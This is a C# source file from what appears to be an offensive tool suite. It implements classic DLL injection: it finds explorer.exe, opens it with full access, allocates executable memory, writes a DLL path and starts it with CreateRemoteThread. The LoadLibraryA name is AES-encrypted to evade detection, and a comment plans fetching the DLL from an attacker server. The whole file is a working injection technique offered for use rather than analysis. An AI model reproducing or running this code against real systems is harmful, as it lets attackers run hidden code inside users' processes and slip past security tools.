using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;
using static NetRunners.Data.Structs;

namespace NetRunners.Runners
{
    // credits: https://github.com/tasox/CSharp_Process_Injection/blob/main/02.%20Process_Injection_template_(High%20Level%20Windows%20API)%20-%20Suspend/Program.cs
    // NOTE: NEEDS A C++ DLL WITH DLL_MAIN TO WORK
    public class ClassicDllInjectionRunner : IRunner
    {
        public void Run()
        {
            IntPtr SnapShot = CreateToolhelp32Snapshot(0x00000002, 0); //2 = SNAPSHOT of all procs
            ProcessEntry32 pe32 = new ProcessEntry32();
            pe32.dwSize = (uint)Marshal.SizeOf(pe32);

            // heads up
            string techniqueName = "Classic Dll Process Injection";
            string targetProcess = "explorer.exe";                       // suffix needed
            PrintTechniqueInfo(techniqueName, targetProcess);

            // Retrieve all the processes.
            while (Process32Next(SnapShot, ref pe32) != 0)
            {
                if (pe32.szExeFile == targetProcess)
                {
                    IntPtr hProcess = default;
                    int processID = (int)pe32.th32ProcessID;
                    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)processID);

                    String dir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    String dllName = dir + "\\NR.dll";                                         // TO-DO: download from attacker webserver or SMB share string url = http// \\IP\share

                    //Allocate space
                    int sBuf = SelectPayloadSize();
                    IntPtr pRMemory = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE); // change size

                    var allocAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
                    UInt64 number = UInt64.Parse(allocAddress); // String -> Int
                    string allocAddressHex = number.ToString("x"); // Int -> Hex
                    Console.WriteLine("[+] Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

                    IntPtr outSize;

                    //Write to remote process

                    WriteProcessMemory(hProcess, pRMemory, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                    IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptBytesToStringAes(LoadLibraryA_Bytes, AesKey));

                    var dllAddress = string.Format("{0:X}", pRMemory); // Pointer -> String
                    UInt64 dllnumber = UInt64.Parse(dllAddress); // String -> Int
                    string dllAddressHex = number.ToString("x"); // Int -> Hex
                    Console.WriteLine($"[+] The Address of the Loaded DLL is 0x{dllAddressHex}");

                    //Enumerate the threads of the remote process before creating a new one.
                    List<int> threadList = new List<int>();
                    ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threadsBefore)
                    {
                        threadList.Add(thread.Id);
                    }

                    //Create a remote thread and execute it
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, pRMemory, 0, IntPtr.Zero);

                    //Enumerate threads from the given process.
                    ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
                    foreach (ProcessThread thread in threads)
                    {
                        if (!threadList.Contains(thread.Id))
                        {
                            Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                        }
                    }
                }
            }
        }
    }
}
